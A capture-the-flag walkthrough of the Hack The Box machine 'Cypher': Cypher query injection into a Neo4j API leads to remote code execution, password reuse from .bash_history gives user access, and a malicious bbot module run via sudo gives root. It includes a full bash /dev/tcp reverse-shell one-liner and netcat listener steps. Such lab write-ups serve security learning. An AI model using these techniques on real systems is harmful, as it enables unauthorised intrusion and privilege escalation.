# 🔐 HTB Machine: Cypher
![Screenshot](https://imgur.com/mrgrbON.png)
### 🌐 Machine Information
- **IP:**  10.10.11.57
- **OS:** Linux
### 🔹 Initial Enumeration
- To start off, I performed a port scan to discover services running on the target: `nmap 10.10.11.57 -A -p- -oN nmap_scan`
![Screenshot](https://imgur.com/APIFmvR.png)
- Nmap Results 2 open ports: `22 (ssh)`, `80 (HTTP)`
- Navigating to 10.10.11.57 in a browser shows me Cypher's webpage. To view it properly, I added cypher.htb to /etc/hosts first.
![Screenshot](https://imgur.com/vf3gLqv.png)
- The website has a login page. Some trial messages hinted it wasn't using SQL but Cypher Query (since it's a Neo4j backend).
![Screenshot](https://imgur.com/32W8PkW.png)

### 🔹 Directory Enumeration
- Using gobuster, I enumerated hidden directory paths:
![Screenshot](https://imgur.com/4JsZ8fW.png)
![Screenshot](https://imgur.com/1Cu9NXR.png)
- I found some interesting directories like `/testing`, and `/api/cypher`

### 🔹 Source Analysis (/testing)
- The `/testing` directory contains a JAR file.
![Screenshot](https://imgur.com/w6oOUGD.png)
- Decompiling it brought me onto a source code of a function
![Screenshot](https://imgur.com/88g4XJM.png)

### 🔹 Query Injection
- Accessing the `/api/cypher` endpoint returned a "Field Required" message.
![Screenshot](https://imgur.com/Kynywf3.png)
- It seems like it needs a query field.
- So I tried to insert a cypher query In the query field
![Screenshot](https://imgur.com/cJgzkZ0.png)
- And it works, so I tried to see what function can I run.
- Using the `SHOW PROCEDURES;` I found a function that I got on the /testing directory.
![Screenshot](https://imgur.com/uwPyc1M.png)

### 🔹 Reverse Shell (neo4j)
- To execute a reverse shell, I base64-encoded a bash reverse: `bash -c 'bash -i >& /dev/tcp/[MY-IP]/[PORT] 0>&1'`
- Then I injected this base64-encoded command into the procedure’s url parameter. Meanwhile, I listened for a connection:
![Screenshot](https://imgur.com/Hgjgf0O.png)
- So basically, because the function needs a url, I use a dummy url and add a reverse shell encoded with base64, then it got decoded and executes the reverse shell.
- Running the injection successfully drops me into shell as `neo4j`.
![Screenshot](https://imgur.com/M9PIjPa.png)

### 🔹 User Access (graphasm)
- So when I checked `/etc/passwd`, there are other users with the name graphasm.
![Screenshot](https://imgur.com/xgeWWic.png)
- While searching trough files, I got some interesting files, its in `/var/lib/neo4j`
- There is some kind of password in the `.bash_history` file
![Screenshot](https://imgur.com/fSrevG6.png)
- So I tried to login to graphism user using this password
![Screenshot](https://imgur.com/M4e3uVK.png)
- And it works
- So with graphasm user I can get the user flag
![Screenshot](https://imgur.com/fY8t4qa.png)

### 🔹 Privilege Escalation (root)
- Running `sudo -l` as graphasm shows we can execute bbot as root.
![Screenshot](https://imgur.com/qo7Vr0k.png)
- Running bbot shows what can bbot do and its command
![Screenshot](https://imgur.com/ZqTMEra.png)
- Based on the bbot documentation I can use my own preset
![Screenshot](https://imgur.com/7xyQRfU.png)
- This allows me to use my custom modules also, based on this information I assume that I can create my custom preset that load my custom modules directory then I can run my malicious module to escalate my privilege as root
- To exploit this, There is a preset that is already provided in the `/home/graphasm` directory, I will modify it by adding the malicious module directory
![Screenshot](https://imgur.com/A0NUdKN.png)
- Now I will start making the malicious module, I will use the existing module as a reference, the existing module located in `/opt/pipx/venvs/bbot/lib/python3.12/site-packages/bbot/modules`
- I will use `bevigil.py` as reference
![Screenshot](https://imgur.com/gPCmnuK.png)
- I'm adding a reverse shell script at the top of the file so it runs first.
- Before running the custom bbot module, I run nc -lvnp 4444 first to catch the reverse shell
- Then I run this command to run the malicious script
![Screenshot](https://imgur.com/8xoLnVg.png)
- Then the nc will be root shell
![Screenshot](https://imgur.com/bDmX88C.png)
 With this I can get the root flag
![Screennshot](https://imgur.com/evWKZoZ.png)